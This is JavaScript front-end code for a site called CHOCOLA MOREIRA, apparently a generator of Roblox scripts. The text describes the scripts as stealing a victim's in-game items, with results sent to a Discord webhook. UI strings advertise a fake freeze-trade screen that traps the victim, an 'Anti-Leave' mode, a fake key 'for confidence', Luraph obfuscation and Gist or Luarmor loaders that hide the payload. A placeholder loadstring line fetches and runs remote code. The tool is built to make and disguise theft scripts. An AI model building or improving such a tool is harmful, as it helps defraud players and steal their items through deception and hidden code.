        const API_BASE = '/api';
        const GIST_UPLOAD_URL = `${API_BASE}/gist-upload`;
        const LUARMOR_UPLOAD_URL = `${API_BASE}/LuarmorLat-upload`;
        const OBFUSCATE_URL = `${API_BASE}/obfuscate`;

        window.isVerified = false;
        window.currentUser = null;
        window.currentTargetId = "";
        window.currentTargetName = "";
        window.selectedTargets = new Set();
        window.scriptMode = "NO-GUI";
        window.scriptType = "logic";
        window.useGist = false;
        window.useLuarmor = false;
        window.obfuscateMode = false;
        window.useFakeKey = false;
        window.useAntiLeave = false;
        window.searchTerms = { brainrot: '', baseskin: '', gear: '' };
        let lastGenerationTime = 0;
        const GENERATION_COOLDOWN = 60000;

        const translations = {
            es: {
                live: 'LIVE', liveSub: 'Script Generator', tagline: 'Configura tu script y genéralo al instante, listo para copiar.',
                configTitle: 'Configuración', loginTitle: 'Inicio de sesión requerido',
                loginDesc: 'Necesitas iniciar sesión con Discord para acceder al generador de scripts.',
                loginSubtitle: 'Inicia sesión para generar tu script', loginBtnText: 'Iniciar sesión con Discord',
                joinServer: '💬 Únete al servidor CHOCOLA MOREIRA', targetUsernameLabel: '🎮 NOMBRE DE USUARIO DE ROBLOX',
                webhookLabel: '📡 WEBHOOK', scriptModeLabel: '🎨 MODO DE SCRIPT',
                modeNoGuiTitle: 'NO-GUI', modeNoGuiDesc: 'Sin interfaz gráfica',
                modeFreezeTitle: 'UI Fake Freeze Trade', modeFreezeDesc: 'UI falsa que no deja salir del juego', modeFreezeSub: 'Más tiempo para robar items',
                modeFakeInstaTitle: 'FAKE INSTA STEAL', modeFakeInstaDesc: 'Simula robo instantáneo con UI falsa', modeFakeInstaSub: 'Script visual',
                modeDuelsTitle: 'DUELS — Vampire Hub', modeDuelsDesc: 'Script de duelos', modeDuelsSub: 'Vampire Hub',
                modeCustomTitle: 'CUSTOM', modeCustomDesc: 'Loader personalizado',
                brainrotLabel: '🧠 BRAINROTS', baseskinLabel: '🎨 BASE SKINS', gearLabel: '⚙️ GEARS',
                gistLabel: '📋 Gist Loader', gistDesc: 'Sube el script a GitHub Gist y devuelve un loadstring seguro',
                luarmorLabel: '📋 Luarmor Loader', luarmorDesc: 'Sube el script a Luarmor y devuelve un loadstring seguro',
                obfuscateLabel: '🛡️ Luraph v15', obfuscateDesc: 'Protección profesional de scripts con Luraph v15',
                fakeKeyLabel: '🔑 FAKE KEY', fakeKeyDesc: 'Añade una key falsa al inicio del script para confianza',
                antiLeaveLabel: '🚫 Anti-Leave', antiLeaveDesc: 'Evita que la víctima salga del juego',
                fakeKeyHint: '⚡ Ejemplo: <span class="highlight">FREE-4a5f4g4nto8</span> · Esta key aparecerá como <span class="highlight">script_key = "tu_key"</span> en el script',
                scriptNameLabel: '📝 NOMBRE DE TU SCRIPT EN GIST', scriptNameHint: '⚡ Activa <span class="highlight">Gist Loader</span> para personalizar el nombre',
                scriptNameActive: '⚡ Elige un nombre único. Se subirá como <span class="highlight">TU_NOMBRE.lua</span> a Gist',
                scriptNameInactive: '⚡ Activa <span class="highlight">Gist Loader</span> para personalizar el nombre',
                generateBtn: '✨ GENERAR SCRIPT', loginRequired: '🔒 INICIO DE SESIÓN REQUERIDO',
                selectTargets: '⚠ SELECCIONA TARGETS PRIMERO', enterUsername: '⚠ INGRESA UN NOMBRE DE USUARIO DE ROBLOX',
                enterName: '⚠ INGRESA UN NOMBRE PARA GIST', resultTitle: '📜 Script generado', copyBtn: 'Copiar',
                creatorRole: '👑 Desarrollador & Fundador', creatorDesc: 'Creado y mantenido CHOCOLA MOREIRA — el generador de scripts definitivo para Roblox.',
                footerText: '💬 Únete a CHOCOLA MOREIRA para soporte y actualizaciones',
                toastCopied: '📋 Copiado al portapapeles', toastGenerated: '✅ Script generado',
                toastLoginFirst: '🔒 Inicia sesión con Discord primero', toastSelectTargets: '⚠️ Selecciona al menos un target',
                toastEnterUsername: '❌ Ingresa un nombre de usuario de Roblox', toastEnterName: '❌ Elige un nombre para tu script',
                toastUploading: '📦 Subiendo a {0}...', toastUploadSuccess: '✅ Script subido a {0} como: {1}',
                toastUploadFail: '⚠️ Falló la subida a {0}: {1}', toastObfuscating: '🔒 Ofuscando con Luraph v15...',
                toastObfuscated: '✅ Script ofuscado correctamente', toastObfuscateFail: '⚠️ La ofuscación falló, usando script original',
                toastGistActivated: '📋 Gist Loader activado - Puedes personalizar el nombre', toastGistDeactivated: '📋 Gist Loader desactivado',
                toastLuarmorActivated: '📋 Luarmor Loader activado', toastLuarmorDeactivated: '📋 Luarmor Loader desactivado',
                toastFakeKeyActivated: '🔑 FAKE KEY activada', toastFakeKeyDeactivated: '🔑 FAKE KEY desactivada',
                toastAntiLeaveActivated: '🚫 Anti-Leave activado', toastAntiLeaveDeactivated: '🚫 Anti-Leave desactivado',
                userSelected: '✅ Usuario seleccionado: {0} (ID: {1})', modeSelected: '✅ Modo seleccionado: {0}',
                userNotFound: 'Usuario no encontrado', searchPlaceholder: 'Buscar usuario de Roblox...',
                webhookPlaceholder: 'Ej: https://discord.com/api/webhooks/1234567890/abcdefg',
                customPlaceholder: 'Ej: loadstring(game:HttpGet(\'https://tu-ui.com/ui.lua\'))()',
                brainrotPlaceholder: 'Seleccionar brainrots...', baseskinPlaceholder: 'Seleccionar base skins...', gearPlaceholder: 'Seleccionar gears...',
                scriptNamePlaceholder: 'Ej: MiSuperScript', selectAll: 'Seleccionar todo', deselectAll: 'Deseleccionar', close: 'Cerrar',
                searchBrainrot: 'Buscar brainrots...', searchBaseskin: 'Buscar base skins...', searchGear: 'Buscar gears...',
                selected: 'seleccionado', more: 'más', fakeKeyPlaceholder: 'FREE-4a5f4g4nto8',
                toastCooldown: '⏳ Espera {0} segundos antes de generar otro script',
                badge1: '⚡ Generación instantánea', badge2: '🔒 Webhook seguro', badge3: '🎯 3 categorías de targets',
                badge4: '🛡️ Ofuscación Luraph v15.1', badge5: '📋 Gist/Luarmor Loader', badge6: '🛡️ Anti-Bot',
                badge7: '🔑 FAKE KEY', badge8: '✨ Nuevos Brainrots & Gears', badge9: '🚫 Anti-Leave'
            },
            en: {
                live: 'LIVE', liveSub: 'Script Generator', tagline: 'Configure your script and generate it instantly, ready to copy.',
                configTitle: 'Configuration', loginTitle: 'Login Required',
                loginDesc: 'You need to log in with Discord to access the script generator.',
                loginSubtitle: 'Login to generate your script', loginBtnText: 'Login with Discord',
                joinServer: '💬 Join CHOCOLA MOREIRA server', targetUsernameLabel: '🎮 ROBLOX USERNAME',
                webhookLabel: '📡 WEBHOOK', scriptModeLabel: '🎨 SCRIPT MODE',
                modeNoGuiTitle: 'NO-GUI', modeNoGuiDesc: 'No graphical interface',
                modeFreezeTitle: 'UI Fake Freeze Trade', modeFreezeDesc: 'Fake UI that prevents leaving the game', modeFreezeSub: 'More time to steal items',
                modeFakeInstaTitle: 'FAKE INSTA STEAL', modeFakeInstaDesc: 'Simulates instant steal with fake UI', modeFakeInstaSub: 'Visual script',
                modeDuelsTitle: 'DUELS — Vampire Hub', modeDuelsDesc: 'Duels script', modeDuelsSub: 'Vampire Hub',
                modeCustomTitle: 'CUSTOM', modeCustomDesc: 'Custom loader',
                brainrotLabel: '🧠 BRAINROTS', baseskinLabel: '🎨 BASE SKINS', gearLabel: '⚙️ GEARS',
                gistLabel: '📋 Gist Loader', gistDesc: 'Upload the script to GitHub Gist and return a secure loadstring',
                luarmorLabel: '📋 Luarmor Loader', luarmorDesc: 'Upload the script to Luarmor and return a secure loadstring',
                obfuscateLabel: '🛡️ Luraph v15', obfuscateDesc: 'Professional script protection with Luraph v15',
                fakeKeyLabel: '🔑 FAKE KEY', fakeKeyDesc: 'Add a fake key at the beginning of the script for confidence',
                antiLeaveLabel: '🚫 Anti-Leave', antiLeaveDesc: 'Prevents the victim from leaving the game',
                fakeKeyHint: '⚡ Example: <span class="highlight">FREE-4a5f4g4nto8</span> · This key will appear as <span class="highlight">script_key = "your_key"</span> in the script',
                scriptNameLabel: '📝 YOUR GIST SCRIPT NAME', scriptNameHint: '⚡ Activate <span class="highlight">Gist Loader</span> to customize the name',
                scriptNameActive: '⚡ Choose a unique name. It will be uploaded as <span class="highlight">YOUR_NAME.lua</span> to Gist',
                scriptNameInactive: '⚡ Activate <span class="highlight">Gist Loader</span> to customize the name',
                generateBtn: '✨ GENERATE SCRIPT', loginRequired: '🔒 LOGIN REQUIRED',
                selectTargets: '⚠ SELECT TARGETS FIRST', enterUsername: '⚠ ENTER A ROBLOX USERNAME',
                enterName: '⚠ ENTER A NAME FOR GIST', resultTitle: '📜 Script generated', copyBtn: 'Copy',
                creatorRole: '👑 Developer & Founder', creatorDesc: 'Created and maintained CHOCOLA MOREIRA — the ultimate Roblox script generator.',
                footerText: '💬 Join CHOCOLA MOREIRA for support and updates',
                toastCopied: '📋 Copied to clipboard', toastGenerated: '✅ Script generated',
                toastLoginFirst: '🔒 Please login with Discord first', toastSelectTargets: '⚠️ Please select at least one target',
                toastEnterUsername: '❌ Please enter a Roblox username', toastEnterName: '❌ Please choose a name for your Gist script',
                toastUploading: '📦 Uploading to {0}...', toastUploadSuccess: '✅ Script uploaded to {0} as: {1}',
                toastUploadFail: '⚠️ Failed to upload to {0}: {1}', toastObfuscating: '🔒 Obfuscating with Luraph v15...',
                toastObfuscated: '✅ Script obfuscated successfully', toastObfuscateFail: '⚠️ Obfuscation failed, using original script',
                toastGistActivated: '📋 Gist Loader activated - You can customize the name', toastGistDeactivated: '📋 Gist Loader deactivated',
                toastLuarmorActivated: '📋 Luarmor Loader activated', toastLuarmorDeactivated: '📋 Luarmor Loader deactivated',
                toastFakeKeyActivated: '🔑 FAKE KEY activated', toastFakeKeyDeactivated: '🔑 FAKE KEY deactivated',
                toastAntiLeaveActivated: '🚫 Anti-Leave activated', toastAntiLeaveDeactivated: '🚫 Anti-Leave deactivated',
                userSelected: '✅ User selected: {0} (ID: {1})', modeSelected: '✅ Mode selected: {0}',
                userNotFound: 'User not found', searchPlaceholder: 'Search Roblox username...',
                webhookPlaceholder: 'Ej: https://discord.com/api/webhooks/1234567890/abcdefg',
                customPlaceholder: 'Ej: loadstring(game:HttpGet(\'https://tu-ui.com/ui.lua\'))()',
                brainrotPlaceholder: 'Select brainrots...', baseskinPlaceholder: 'Select base skins...', gearPlaceholder: 'Select gears...',
                scriptNamePlaceholder: 'Ej: MiSuperScript', selectAll: 'Select All', deselectAll: 'Deselect', close: 'Close',
                searchBrainrot: 'Search brainrots...', searchBaseskin: 'Search base skins...', searchGear: 'Search gears...',
                selected: 'selected', more: 'more', fakeKeyPlaceholder: 'FREE-4a5f4g4nto8',
                toastCooldown: '⏳ Wait {0} seconds before generating another script',
                badge1: '⚡ Instant generation', badge2: '🔒 Secure webhook', badge3: '🎯 3 target categories',
                badge4: '🛡️ Luraph v15.1 obfuscation', badge5: '📋 Gist/Luarmor Loader', badge6: '🛡️ Anti-Bot',
                badge7: '🔑 FAKE KEY', badge8: '✨ New Brainrots & Gears', badge9: '🚫 Anti-Leave'
            },
            pt: {
                live: 'AO VIVO', liveSub: 'Gerador de Scripts', tagline: 'Configure seu script e gere-o instantaneamente, pronto para copiar.',
                configTitle: 'Configuração', loginTitle: 'Login necessário',
                loginDesc: 'Você precisa fazer login com o Discord para acessar o gerador de scripts.',
                loginSubtitle: 'Faça login para gerar seu script', loginBtnText: 'Entrar com Discord',
                joinServer: '💬 Entre no servidor CHOCOLA MOREIRA', targetUsernameLabel: '🎮 NOME DE USUÁRIO DO ROBLOX',
                webhookLabel: '📡 WEBHOOK', scriptModeLabel: '🎨 MODO DE SCRIPT',
                modeNoGuiTitle: 'NO-GUI', modeNoGuiDesc: 'Sem interface gráfica',
                modeFreezeTitle: 'UI Fake Freeze Trade', modeFreezeDesc: 'UI falsa que não deixa sair do jogo', modeFreezeSub: 'Mais tempo para roubar itens',
                modeFakeInstaTitle: 'FAKE INSTA STEAL', modeFakeInstaDesc: 'Simula roubo instantâneo com UI falsa', modeFakeInstaSub: 'Script visual',
                modeDuelsTitle: 'DUELS — Vampire Hub', modeDuelsDesc: 'Script de duelos', modeDuelsSub: 'Vampire Hub',
                modeCustomTitle: 'CUSTOM', modeCustomDesc: 'Loader personalizado',
                brainrotLabel: '🧠 BRAINROTS', baseskinLabel: '🎨 BASE SKINS', gearLabel: '⚙️ GEARS',
                gistLabel: '📋 Gist Loader', gistDesc: 'Envia o script para o GitHub Gist e retorna um loadstring seguro',
                luarmorLabel: '📋 Luarmor Loader', luarmorDesc: 'Envia o script para o Luarmor e retorna um loadstring seguro',
                obfuscateLabel: '🛡️ Luraph v15', obfuscateDesc: 'Proteção profissional de scripts com Luraph v15',
                fakeKeyLabel: '🔑 FAKE KEY', fakeKeyDesc: 'Adicione uma chave falsa no início do script para confiança',
                antiLeaveLabel: '🚫 Anti-Leave', antiLeaveDesc: 'Evita que a vítima saia do jogo',
                fakeKeyHint: '⚡ Exemplo: <span class="highlight">FREE-4a5f4g4nto8</span> · Esta chave aparecerá como <span class="highlight">script_key = "sua_chave"</span> no script',
                scriptNameLabel: '📝 NOME DO SEU SCRIPT NO GIST', scriptNameHint: '⚡ Ative o <span class="highlight">Gist Loader</span> para personalizar o nome',
                scriptNameActive: '⚡ Escolha um nome único. Será enviado como <span class="highlight">SEU_NOME.lua</span> para o Gist',
                scriptNameInactive: '⚡ Ative o <span class="highlight">Gist Loader</span> para personalizar o nome',
                generateBtn: '✨ GERAR SCRIPT', loginRequired: '🔒 LOGIN NECESSÁRIO',
                selectTargets: '⚠ SELECIONE ALVOS PRIMEIRO', enterUsername: '⚠ DIGITE UM NOME DE USUÁRIO DO ROBLOX',
                enterName: '⚠ DIGITE UM NOME PARA O GIST', resultTitle: '📜 Script gerado', copyBtn: 'Copiar',
                creatorRole: '👑 Desenvolvedor & Fundador', creatorDesc: 'Criado e mantido CHOCOLA MOREIRA — o gerador de scripts definitivo para Roblox.',
                footerText: '💬 Entre no CHOCOLA MOREIRA para suporte e atualizações',
                toastCopied: '📋 Copiado para a área de transferência', toastGenerated: '✅ Script gerado',
                toastLoginFirst: '🔒 Faça login com o Discord primeiro', toastSelectTargets: '⚠️ Selecione pelo menos um alvo',
                toastEnterUsername: '❌ Digite um nome de usuário do Roblox', toastEnterName: '❌ Escolha um nome para seu script no Gist',
                toastUploading: '📦 Enviando para {0}...', toastUploadSuccess: '✅ Script enviado para {0} como: {1}',
                toastUploadFail: '⚠️ Falha ao enviar para {0}: {1}', toastObfuscating: '🔒 Ofuscando com Luraph v15...',
                toastObfuscated: '✅ Script ofuscado com sucesso', toastObfuscateFail: '⚠️ A ofuscação falhou, usando script original',
                toastGistActivated: '📋 Gist Loader ativado - Você pode personalizar o nome', toastGistDeactivated: '📋 Gist Loader desativado',
                toastLuarmorActivated: '📋 Luarmor Loader ativado', toastLuarmorDeactivated: '📋 Luarmor Loader desativado',
                toastFakeKeyActivated: '🔑 FAKE KEY ativada', toastFakeKeyDeactivated: '🔑 FAKE KEY desativada',
                toastAntiLeaveActivated: '🚫 Anti-Leave ativado', toastAntiLeaveDeactivated: '🚫 Anti-Leave desativado',
                userSelected: '✅ Usuário selecionado: {0} (ID: {1})', modeSelected: '✅ Modo selecionado: {0}',
                userNotFound: 'Usuário não encontrado', searchPlaceholder: 'Buscar usuário do Roblox...',
                webhookPlaceholder: 'Ex: https://discord.com/api/webhooks/1234567890/abcdefg',
                customPlaceholder: 'Ex: loadstring(game:HttpGet(\'https://tu-ui.com/ui.lua\'))()',
                brainrotPlaceholder: 'Selecionar brainrots...', baseskinPlaceholder: 'Selecionar base skins...', gearPlaceholder: 'Selecionar gears...',
                scriptNamePlaceholder: 'Ex: MeuSuperScript', selectAll: 'Selecionar tudo', deselectAll: 'Desselecionar', close: 'Fechar',
                searchBrainrot: 'Buscar brainrots...', searchBaseskin: 'Buscar base skins...', searchGear: 'Buscar gears...',
                selected: 'selecionado', more: 'mais', fakeKeyPlaceholder: 'FREE-4a5f4g4nto8',
                toastCooldown: '⏳ Espere {0} segundos antes de gerar outro script',
                badge1: '⚡ Geração instantânea', badge2: '🔒 Webhook seguro', badge3: '🎯 3 categorias de alvos',
                badge4: '🛡️ Ofuscação Luraph v15.1', badge5: '📋 Gist/Luarmor Loader', badge6: '🛡️ Anti-Bot',
                badge7: '🔑 FAKE KEY', badge8: '✨ Novos Brainrots & Gears', badge9: '🚫 Anti-Leave'
            }
        };

        let currentLang = 'es';

        function applyLanguage(lang) {
            currentLang = lang; const t = translations[lang]; if (!t) return;
            localStorage.setItem('chocola_lang', lang);
            document.querySelectorAll('.language-selector button').forEach(btn => { btn.classList.toggle('active', btn.dataset.lang === lang); });
            const elements = {
                liveText: 'live', liveSubText: 'liveSub', taglineText: 'tagline', configTitle: 'configTitle',
                loginTitle: 'loginTitle', loginDesc: 'loginDesc', loginSubtitle: 'loginSubtitle', loginBtnText: 'loginBtnText',
                joinServerLink: 'joinServer', targetUsernameLabel: 'targetUsernameLabel', webhookLabel: 'webhookLabel',
                scriptModeLabel: 'scriptModeLabel', modeNoGuiTitle: 'modeNoGuiTitle', modeNoGuiDesc: 'modeNoGuiDesc',
                modeFreezeTitle: 'modeFreezeTitle', modeFreezeDesc: 'modeFreezeDesc', modeFreezeSub: 'modeFreezeSub',
                modeFakeInstaTitle: 'modeFakeInstaTitle', modeFakeInstaDesc: 'modeFakeInstaDesc', modeFakeInstaSub: 'modeFakeInstaSub',
                modeDuelsTitle: 'modeDuelsTitle', modeDuelsDesc: 'modeDuelsDesc', modeDuelsSub: 'modeDuelsSub',
                modeCustomTitle: 'modeCustomTitle', modeCustomDesc: 'modeCustomDesc', brainrotLabel: 'brainrotLabel',
                baseskinLabel: 'baseskinLabel', gearLabel: 'gearLabel', gistLabel: 'gistLabel', gistDesc: 'gistDesc',
                luarmorLabel: 'luarmorLabel', luarmorDesc: 'luarmorDesc', obfuscateLabel: 'obfuscateLabel', obfuscateDesc: 'obfuscateDesc',
                fakeKeyLabel: 'fakeKeyLabel', fakeKeyDesc: 'fakeKeyDesc', antiLeaveLabel: 'antiLeaveLabel', antiLeaveDesc: 'antiLeaveDesc',
                scriptNameLabel: 'scriptNameLabel', creatorRole: 'creatorRole', creatorDesc: 'creatorDesc', resultTitle: 'resultTitle',
                copyBtn: 'copyBtn', badge1: 'badge1', badge2: 'badge2', badge3: 'badge3', badge4: 'badge4', badge5: 'badge5',
                badge6: 'badge6', badge7: 'badge7', badge8: 'badge8', badge9: 'badge9', footerLink: 'footerText'
            };
            for (const [id, key] of Object.entries(elements)) { const el = document.getElementById(id); if (el && t[key] !== undefined) { el.textContent = t[key]; } }
            const hint = document.getElementById('fakeKeyHint'); if (hint) hint.innerHTML = t.fakeKeyHint;
            const placeholders = { fakeKeyInput: t.fakeKeyPlaceholder, usernameInput: t.searchPlaceholder, webhookUrl: t.webhookPlaceholder, customLoader: t.customPlaceholder, brainrotSearch: t.searchBrainrot, baseskinSearch: t.searchBaseskin, gearSearch: t.searchGear, scriptNameInput: t.scriptNamePlaceholder };
            for (const [id, placeholder] of Object.entries(placeholders)) { const el = document.getElementById(id); if (el && placeholder !== undefined) { el.placeholder = placeholder; } }
            updateNameHint(); updateButtonState();
        }

        function updateNameHint() {
            const t = translations[currentLang]; const hint = document.getElementById('scriptNameHint');
            if (hint) { hint.innerHTML = window.useGist ? t.scriptNameActive : t.scriptNameInactive; }
        }

        function enableForm(enabled) {
            document.querySelectorAll('.user-input, .search-input, .toggle-btn, .target-selector-btn, .mode-card, .panel-quick-btn, .panel-actions button').forEach(el => {
                if (el.tagName === 'BUTTON' || el.tagName === 'INPUT') el.disabled = !enabled;
                if (el.classList) { if (enabled) el.classList.remove('disabled'); else el.classList.add('disabled'); }
            });
            ['toggleGistBtn', 'toggleLuarmorBtn', 'toggleObfuscateBtn', 'toggleFakeKeyBtn', 'toggleAntiLeaveBtn', 'scriptNameInput', 'fakeKeyInput'].forEach(id => {
                const el = document.getElementById(id); if (el) el.disabled = !enabled;
            });
            document.querySelectorAll('.target-item').forEach(el => { if (enabled) el.classList.remove('disabled'); else el.classList.add('disabled'); });
            updateButtonState();
        }

        function updateUI(verified, user) {
            window.isVerified = verified; window.currentUser = user;
            if (verified && user) {
                document.getElementById('discordBtn').className = 'discord-btn verified';
                document.getElementById('discordBtnText').textContent = '✅ Verified';
                document.getElementById('userInfo').style.display = 'flex';
                document.getElementById('loginOverlay').classList.add('hidden');
                document.getElementById('loginNotice').classList.remove('show');
                let avatarUrl = '';
                if (user.avatar) { const ext = user.avatar.startsWith('a_') ? 'gif' : 'png'; avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`; }
                else { const i = Number(BigInt(user.id) >> 22n) % 6; avatarUrl = `https://cdn.discordapp.com/embed/avatars/${i}.png`; }
                document.getElementById('userAvatar').src = avatarUrl;
                document.getElementById('userAvatar').onerror = function() { const i = Number(BigInt(user.id) >> 22n) % 6; this.src = `https://cdn.discordapp.com/embed/avatars/${i}.png`; };
                document.getElementById('userNameText').textContent = user.global_name || user.username || 'User';
                enableForm(true);
            } else {
                document.getElementById('discordBtn').className = 'discord-btn';
                document.getElementById('discordBtnText').textContent = 'Login';
                document.getElementById('userInfo').style.display = 'none';
                document.getElementById('loginOverlay').classList.remove('hidden');
                document.getElementById('loginNotice').classList.add('show');
                enableForm(false);
            }
            updateButtonState();
        }

        function updateButtonState() {
            const btn = document.getElementById('generateBtn');
            const hasTarget = window.currentTargetId !== "";
            const hasSelections = window.selectedTargets?.size > 0;
            const t = translations[currentLang];
            if (!window.isVerified) { btn.disabled = true; btn.innerHTML = t.loginRequired; }
            else if (!hasSelections) { btn.disabled = true; btn.innerHTML = t.selectTargets; }
            else if (!hasTarget) { btn.disabled = true; btn.innerHTML = t.enterUsername; }
            else { btn.disabled = false; btn.innerHTML = t.generateBtn; }
        }

        function showToast(msg, type = 'info') {
            const ex = document.querySelector('.toast'); if (ex) ex.remove();
            const toast = document.createElement('div'); toast.className = `toast ${type}`; toast.textContent = msg;
            document.body.appendChild(toast); setTimeout(() => toast.remove(), 3500);
        }

        (function checkLogin() {
            console.log('🔍 Verificando autenticación...');
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('login') === 'success') {
                const encoded = urlParams.get('user');
                if (encoded) {
                    try {
                        const userData = JSON.parse(atob(decodeURIComponent(encoded)));
                        console.log('✅ Usuario desde URL:', userData);
                        localStorage.setItem('chocola_session', JSON.stringify(userData));
                        try { document.cookie = `chocola_user=${encodeURIComponent(JSON.stringify(userData))}; path=/; max-age=86400; SameSite=Lax`; } catch (e) {}
                        updateUI(true, userData);
                        window.history.replaceState({}, document.title, window.location.pathname);
                        showToast(translations.es.toastGenerated, 'success');
                        return;
                    } catch (e) { console.error('Error decodificando:', e); }
                }
            }
            const saved = localStorage.getItem('chocola_session');
            if (saved) { try { const userData = JSON.parse(saved); updateUI(true, userData); return; } catch (e) { localStorage.removeItem('chocola_session'); } }
            try {
                const cookies = document.cookie.split(';');
                for (let cookie of cookies) {
                    const [name, value] = cookie.trim().split('=');
                    if (name === 'chocola_user' && value) { const userData = JSON.parse(decodeURIComponent(value)); localStorage.setItem('chocola_session', JSON.stringify(userData)); updateUI(true, userData); return; }
                }
            } catch (e) {}
            updateUI(false);
        })();

        document.getElementById('loginOverlayBtn').addEventListener('click', function() {
            this.innerHTML = '<span class="loading-spinner"></span> Conectando...'; this.disabled = true;
            const clientId = '1518751578603913216';
            const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
            const scope = 'identify';
            setTimeout(() => { window.location.href = `https://discord.com/oauth2/authorize?client_id=${clientId}&response_type=code&redirect_uri=${redirectUri}&scope=${scope}`; }, 500);
        });

        document.getElementById('discordBtn').onclick = () => {
            if (window.isVerified) {
                if (confirm('¿Cerrar sesión?')) {
                    localStorage.removeItem('chocola_session');
                    document.cookie = 'chocola_user=; Path=/; Max-Age=0';
                    document.cookie = 'chocola_session=; Path=/; Max-Age=0';
                    updateUI(false); showToast('👋 Sesión cerrada', 'warning');
                }
            } else { document.getElementById('loginOverlayBtn').click(); }
        };

        // ===== LISTAS DE TARGETS =====
        const OG_BRAINROTS = ["Strawberry Elephant", "Meowl", "Skibidi Toilet", "John Pork", "Headless Horseman"];
        const BEST_SECRET_BRAINROTS = [
            "Hydra Bunny", "Hydra Dragon Cannelloni", "Dragon Cannelloni", "Griffin",
            "Dragon Gingerini", "Antonio", "Elefanto Frigo", "Rico Dinero", "Rubrikiko",
            "Arcadragon", "Pancake and Syrup", "Kalika Bros", "Tirilikalika Tirilikalako",
            "Globa Steppa", "Dug Dug Dug", "La Supreme Combinasion", "La Casa Boo",
            "Dragon Aquanini", "Signore Carapace", "Fishino Clownino", "Cerberus",
            "Duggy Bros", "Kraken", "Venuspino", "Gorillo Subwoofero", "Foxini Lanternini"
        ];
        const BRAINROTS_LIST = [
            "Dragon Skeletonini", "Phoenix", "Plant Bros",
            "Hydra Serpent", "Orchidox",
            "Strawberry Elephant", "Meowl", "Skibidi Toilet",
            "Los Dragons", "La Craft Machine", "Gold and Diamond",
            "Dragon Cannelloni", "Dragon Gingerini", "Griffin", "Hydra Dragon Cannelloni", "Hydra Bunny",
            "Antonio", "John Pork", "Elefanto Frigo", "Rubrikiko",
            "Pancake and Syrup", "Arcadragon", "Rico Dinero", "Capitano Americano",
            "Kalika Bros", "Tirilikalika Tirilikalako", "Globa Steppa", "Dug Dug Dug",
            "Dragon Aquanini", "La Casa Boo", "La Supreme Combinasion", "Headless Horseman",
            "Signore Carapace", "Fishino Clownino", "4th Bros", "Bufalino Boomberino",
            "Duggy Bros", "Cerberus", "Kraken", "Money Money Bros",
            "Venuspino", "Steakini Fattini", "Rhino Helicopterino", "Caylusaurus",
            "Sammyni Cakini", "Centrucci Nuclucci", "Los Hackers", "John Doe",
            "Gorillo Subwoofero", "Jelly Moby", "Foxini Lanternini", "Ginger Cisterna",
            "Bearito Cabinito", "Digi Narwhal",
            "Los Tangcitos", "Los Tictacs", "Moby Bros", "Los Admins",
            "1x1x1x1", "25", "67",
            "Agarrini la Palini", "Arcadopus", "Bacuru and Egguru", "Bananito",
            "Baskito", "Berryno", "Bisonte Giuppitere", "Blackhole GOAT",
            "Boatito Auratito", "Boppin Bunny", "Brunito Marsito", "Bunito Bunito Spinito",
            "Bunnyman", "Bunny and Eggy", "Bunny Bunny Bunny Sahur", "Buntteo",
            "Burguro and Fryuro", "Burrito Bandito", "Capitano Moby", "Cash or Card",
            "Celestial Pegasus", "Celularcini Viciosini", "Chachechi",
            "Chicleteira Bicicleteira", "Chicleteira Cupideira", "Chicleteira Noelteira",
            "Chicleteirina Bicicleteirina", "Chill Puppy", "Chillin Chili", "Chimnino",
            "Chipso and Queso", "Churrito Bunnito", "Cigno Fulgoro", "Cloverat Clapat",
            "Cooki and Milki", "Cuadramat and Pakrahmatmamat", "Cupid Cupid Sahur",
            "Cupid Hotspot", "DJ Panda", "Donkeyturbo Express", "Dul Dul Dul",
            "Easter Easter Easter Sahur", "Eid Eid Eid Sahur", "Esok Sekolah",
            "Eviledon", "Extinct Matteo", "Extinct Tralalero", "Festive 67",
            "Fishboard", "Fortunu and Cashuru", "Fragola La La La",
            "Fragrama and Chocrama", "Frankentteo", "GOAT", "Garama and Madundung",
            "Giftini Spyderini", "Ginger Gerat", "Gobblino Uniciclino", "Gold Gold Gold",
            "Graipuss Medussi", "Granny", "Guerriro Digitale", "Guest 666",
            "Ho Ho Ho Sahur", "Hopilikalika Hopilikalako", "Horegini Boom", "Jackorilla",
            "Job Job Job Sahur", "Jolly Jolly Sahur", "Karker Sahur", "Karkerkar Kurkur",
            "Ketchuru and Musturu", "Ketupat Bros", "Ketupat Kepat", "La Cucaracha",
            "La Easter Grande", "La Extinct Grande", "La Food Combinasion",
            "La Ginger Sekolah", "La Grande Combinasion", "La Jolly Grande",
            "La Karkerkar Combinasion", "La Lucky Grande", "La Romantic Grande",
            "La Sahur Combinasion", "La Secret Combinasion", "La Spooky Grande",
            "La Taco Combinasion", "La Vacca Jacko Linterino", "La Vacca Lepre Lepreino",
            "La Vacca Prese Presente", "La Vacca Saturno Saturnita", "Las Sis",
            "Las Tralaleritas", "Las Vaquitas Saturnitas", "Lavadorito Spinito",
            "Coco and Mango",
            "Los Secret Combinasionas", "Examen Bros", "Pizza and Ranch", "Chicleteira Champeona",
            "List List List Sahur", "Los 25", "Los 67", "Los Amigos",
            "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino",
            "Honey Honey Bear", "Pogo Pogo Penguin", "Conetto Morsetto", "La Breakfast Combinasion",
            "Los Bunitos", "Los Burritos", "Los Candies", "Los Chicleteiras",
            "Los Combinasionas", "Los Cucarachas", "Los Cupids", "Los Hotspotsitos",
            "Los Jobcitos", "Los Jolly Combinasionas", "Los Karkeritos", "Los Matteos",
            "Los Mi Gatitos", "Los Mobilis", "Los Nooo My Hotspotsitos", "Los Planitos",
            "Los Primos", "Los Puggies", "Los Quesadillas", "Los Sekolahs",
            "Los Spaghettis", "Los Spooky Combinasionas", "Los Spyderinis",
            "Los Sweethearts", "Los Tacoritas", "Los Tortus", "Los Tralaleritos",
            "Los Trios", "Love Love Bear", "Love Love Love Sahur", "Lovin Rose",
            "Luck Luck Luck Sahur", "Mariachi Corazoni", "Mi Gatito",
            "Mieteteira Bicicleteira", "Money Money Puggy", "Money Money Reindeer",
            "Nacho Spyder", "Naughty Naughty", "Noo My Candy", "Noo My Eggs",
            "Noo My Examine", "Noo My Gold", "Noo My Heart", "Noo My Present",
            "Nooo My Hotspot", "Nuclearo Dinossauro", "Orcaledon", "Paradiso Axolottino",
            "Perrito Burrito", "Pirulitoita Bicicleteira", "Please My Present",
